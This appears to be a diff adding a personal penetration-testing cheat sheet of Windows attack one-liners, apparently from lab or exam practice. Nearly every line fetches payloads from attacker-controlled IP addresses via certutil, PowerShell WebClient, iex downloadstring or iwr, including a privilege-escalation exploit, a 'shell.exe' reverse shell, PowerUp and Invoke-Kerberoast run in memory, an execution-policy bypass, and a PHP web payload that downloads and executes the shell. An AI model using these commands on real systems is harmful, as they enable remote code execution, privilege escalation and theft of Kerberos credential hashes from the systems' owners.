@@ -1,0 +1,27 @@
+certutil.exe -urlcache -split -f http://10.0.0.5/40564.exe bad.exe
+
+certutil.exe -urlcache -split -f http://10.10.14.7:90/MS11-046.exe MS11-046.exe
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:90/MS11-046.exe', 'c:\Users\Public\Downloads\MS11-046.exe')"
+
+iex(new-object net.webclient).downloadstring('http://192.168.49.194:445/PowerUp.ps1')
+
+wget
+
+curl
+
+<?php exec("certutil.exe -urlcache -f http://192.166.45.233/shell.exe C:\\Windows\\temp\\shell.exe")?>
+<?php exec("C:\\Windows\\temp\\shell.exe")?>
+
+certutil -urlcache -split -f http://192.168.45.233:8000/shell.exe C:/Windows/Temp/shell.exe
+
+certutil -urlcache -split -f http://192.168.45.152/Get-SPN.ps1 Get-SPN.ps1
+
+powershell -ExecutionPolicy Bypass
+
+.\Get-SPN.ps1
+
+
+certutil -urlcache -split -f http://192.168.45.152/Invoke-Kerberoast.ps1 Invoke-Kerberoast.ps1
+iex(new-object net.webclient).downloadString('http://192.168.45.152/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
+powershell iwr http://192.168.45.152/shell_445.exe -outfile shell.exe
